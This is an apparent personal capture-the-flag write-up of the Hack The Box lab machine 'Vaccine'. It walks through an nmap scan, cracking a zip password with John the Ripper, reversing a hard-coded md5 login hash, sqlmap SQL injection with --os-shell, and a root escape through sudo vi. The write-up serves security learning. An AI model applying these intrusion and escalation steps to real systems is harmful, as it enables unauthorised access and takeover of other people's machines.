# Vaccine

The third box in the starting-point zone on https://hackthebox.eu -- a Linux machine.  The name seems to imply something about a virus, maybe a mis-configured antivirus.  We'll find out :)

This box only took one day and the steps I took are fairly on-point so there's no additional "clean walkthrough" unlinke on Oopsie.

## Day 1

We're going to start with a simple nmap scan of the box.  The command I like to use does service version and OS discovery, a TCP SYN scan, the default nmap scripts, and outputs everything to greppable, normal, and XML formats for automation later if I so choose:

```shell
└─$ sudo nmap -oA nmap -O -sV -sC -sS 10.10.10.46 
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 14:58 EDT
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.46
Host is up (0.014s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```

So we have FTP, SSH, and a web server.  Remembering that filezilla.xml file, I plug in the creds and connect.

Looks like there's a backup.zip file, so I'm going to download and upzip it...

### Backup.zip

Trying to unzip it, we're asked to enter a password.  Drats... let's try to crack it.

```shell
└─$ zip2john backup.zip > backup.zip.hashes
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-07-25 15:59) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooo
Use the "--show" option to display all of the cracked passwords reliabl
```

Now that we have the password (741852963) we unzip the file:

```shell
└─$ unzip backup.zip                                               
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css 
```

Looks like a backup of the web application.  Let's take a look at index.php

### Index.php

Not much of a mystery what's going on here if you can read some basic PHP:

```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
    2cb42f8734ea607eefed3b70af13bbd3
  }
?>
```

Looks like the username and password are hard-coded, so let's go visit that webpage and try to login...

Login failed? Oh, wait, is that a hash?  A quick google and we see that hash translates as `qwerty789`, which, when used to login, actually works :)

### Dashboard.php

Here we have a simple table, not much to click on except the search box.  Let's try searching for a quote:

```
http://10.10.10.46/dashboard.php?search='

-->  ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
```

Looks like it's ripe for SQL injection, so let's load up `sqlmap`:

```
└─$ sqlmap http://10.10.10.46/dashboard.php?search=val --cookie="PHPSESSID=jfm634hi0sa9mn0gkgf2fj7c6m" --os-shell
```

And now we have a shell as the postgres user.  Sweet.

### Privilege Escalation

As postgres, we can read /home/simon, /var/www/html and /home/ftpuser but none of htem immediately show anything interesting when we poke around in them.

There is a .ssh folder in the postgres home dir, though, and a private / public key pair there, so that's something.  I grab those down and spawn an SSH session rather than my netcat reverse shell (which I had already upgraded with the `stty raw -echo; fg` trick but which keeps dropping off on me)

After a while of poking around in different directories (/var/log, /var/backups, /tmp, etc) I decide to read the PHP code.

Looks like the postgres password is encoded in that file.  Interesting, let me try and "sudo" with that password... but what can I sudo?

```
postgres@vaccine:/var/www/html$ sudo -l
...
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

So I can run a vi session, great!  That means I can open vim (on that file...) and then type `:shell` and get a root shell... let's try it...

```
root@vaccine:/var/www/html# whoami
root
```

Power.

## Summary

This is the first HTB box I got on my own without looking at the walkthrough!  I peaked at the end, and there's no post-exploitation stuff (I looked around a bit first, also.)  

So to recap:
1. We used the filezilla password to login and grab the backups file
2. We used an online rainbow table to reverse the md5 in the backups to get the password, which let us log in
3. We used SQLi and `sqlmap` to get RCE, which we turned into a reverse shell
4. We looked around and found another password in dashboard.php which let us sudo vi
5. we used :shell in vi to become root and grab the flag
6. There is no user flag, and there is no post exploitation steps

Hurrah!  NEXT BOX!  :)



